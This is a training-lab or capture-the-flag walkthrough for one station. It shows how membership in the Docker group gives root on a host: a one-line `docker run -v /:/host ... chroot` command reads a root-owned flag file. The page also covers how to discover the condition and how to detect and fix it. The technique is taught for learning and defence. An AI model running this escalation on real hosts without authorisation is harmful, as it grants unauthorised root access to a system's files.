# C08 · Station A — mount + chroot → read · ★★☆☆

> **Chapter:** [[Chapter-08-Overview]] · **Next:** [[C08-Station-B-persistence]]
> **Host:** `hollow-forge-01` (`target-docker`) · **Access:** `labuser1` in the `docker` group
> **The bug:** the root daemon's socket lets you mount the host as root.

---

## 1. Exploit — do this first

```bash
docker run --rm -v /:/host rtr/bb chroot /host cat /root/flag.txt
# R2R{...}
```

| Token | What it does |
|---|---|
| `-v /:/host` | bind-mount the host root into the container at `/host` |
| container root | containers run as root by default |
| `chroot /host` | drop onto the host filesystem as uid 0 |

---

## 2. How you find it

```bash
id                            # groups=...,docker
ls -l /var/run/docker.sock    # srw-rw---- root docker — group-writable
docker images                 # rtr/bb (static busybox) is ready
```

## 3. Why it works

The daemon is root, so a container that mounts `/` reads anything regardless of
host permissions. `rtr/bb` is a `FROM scratch` image with a static busybox
providing `chroot`; `cat` is the host's, found after the chroot. On a connected
host you'd just use `alpine` — the lab bakes `rtr/bb` because the box is
airgapped.

## 4. Pitfalls

- The box has no internet — use the baked `rtr/bb`, don't try to pull `alpine`.

## 5. Detect & fix

- **Detect:** `getent group docker`; containers started with `/:/...` mounts.
- **Fix:** don't grant `docker` group casually; rootless Docker/Podman; socket-proxy. [[Blue-Team-Playbook]].

## 6. What you learned

- `docker` group = root. `-v /:/host` + chroot is the whole technique.

> Next: [[C08-Station-B-persistence]]
